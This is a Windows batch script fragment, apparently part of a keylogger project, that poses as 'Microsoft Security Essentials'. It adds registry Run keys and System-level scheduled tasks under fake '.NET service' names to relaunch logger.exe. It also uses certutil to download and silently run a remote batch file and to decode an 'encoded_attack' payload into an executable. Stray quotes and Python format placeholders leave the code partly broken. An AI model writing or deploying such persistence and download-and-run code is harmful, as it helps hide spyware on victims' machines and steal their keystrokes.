REM Microsoft(tm) --- Security Essentials"
@ECHO OFF

mkdir %TEMP%\mcache"
mkdir %APPDATA%\WinHelper"

REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Windows.NET service" /t REG_SZ /f /d '%TEMP%\mcache\logger.exe
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Windows.NET service" /t REG_SZ /f /d '%APPDATA%\WinHelper\logger.exe

schtasks /create /tn 'Windows .NET Services' /tr %TEMP%\mcache\{0} /sc onstart /ru System".format
schtasks /create /tn 'Windows .NET Services' /tr %APPDATA%\WinHelper\{0} /sc onstart /ru System".format


REM ------------------------- REM


REM Microsoft(tm) --- Security Essentials"
@ECHO OFF"
certutil -urlcache -split -f {URL to file} data0.bat && start /b cmd.exe /c data0.bat".
certutil -decode encoded_attack.crt encoded.exe"


REM { 0 } will need to be filled by python if these batch files are to be incorperated in the main logger file.